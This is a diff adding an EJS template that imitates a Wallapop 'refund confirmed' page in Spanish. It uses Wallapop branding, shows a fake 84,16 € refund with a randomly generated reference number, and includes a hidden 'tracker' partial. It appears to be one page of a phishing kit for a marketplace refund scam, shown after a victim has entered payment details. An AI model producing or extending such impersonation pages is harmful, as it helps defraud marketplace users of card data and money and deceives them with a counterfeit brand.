@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <%- include('partials/tracker') %>
+    <title>Wallapop - ¡Pago confirmado!</title>
+    <link rel="icon" type="image/png" href="/img/wallapop-logo.png">
+    <link rel="stylesheet" href="/css/wallapop.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <style>
+        .checkmark-container {
+            width: 72px;
+            height: 72px;
+            margin: 0 auto 20px;
+        }
+        .checkmark-circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 2.5;
+            stroke-miterlimit: 10;
+            stroke: var(--wlp-teal, #13c1ac);
+            fill: none;
+            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+        .checkmark-check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.7s forwards;
+        }
+        @keyframes stroke {
+            100% {
+                stroke-dashoffset: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="wlp-header">
+        <div class="wlp-header-inner">
+            <a href="/" class="wlp-logo-link">
+                <img src="/img/wallapop-logo.png" alt="Wallapop" class="wlp-logo-img">
+            </a>
+        </div>
+    </header>
+
+    <main class="wlp-page-wrapper">
+        <div class="wlp-modal-card" style="text-align: center;">
+            <div class="checkmark-container">
+                <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                    <circle class="checkmark-circle" cx="26" cy="26" r="24" fill="none"/>
+                    <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" stroke="var(--wlp-teal, #13c1ac)" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            
+            <h1 class="wlp-title" style="color: var(--wlp-teal, #13c1ac); margin-bottom: 12px;">¡Reembolso confirmado!</h1>
+            
+            <p style="font-size: 15px; line-height: 1.5; color: #253238; margin-bottom: 20px;">
+                Tu solicitud de reembolso por un importe de <strong>84,16 €</strong> ha sido tramitada con éxito.
+            </p>
+            
+            <div style="background-color: #f7f9fa; border-left: 4px solid var(--wlp-teal, #13c1ac); padding: 14px; margin: 18px 0; border-radius: 4px; text-align: left; font-size: 13.5px; color: #37474f; line-height: 1.5;">
+                El importe se abonará directamente en tu tarjeta o cuenta asociada en un plazo estimado de 24 a 48 horas bancarias.
+            </div>
+            
+            <div style="margin-top: 20px; font-size: 13px; color: #607d8b; background: #f9fbfb; padding: 14px; border-radius: 8px; border: 1px solid #edf1f3; text-align: left;">
+                <p style="margin-bottom: 6px;"><strong>Referencia de reembolso:</strong> REF-<%= Math.floor(100000 + Math.random() * 900000) %></p>
+                <p>Si tienes cualquier duda: <strong>soporte@wallapop.com</strong> o visita el Centro de Ayuda de Wallapop.</p>
+            </div>
+            
+            <div class="wlp-ssl-footer" style="margin-top: 28px;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                <span>Transacción segura y encriptada con Protección Wallapop</span>
+            </div>
+        </div>
+    </main>
+</body>
+</html>
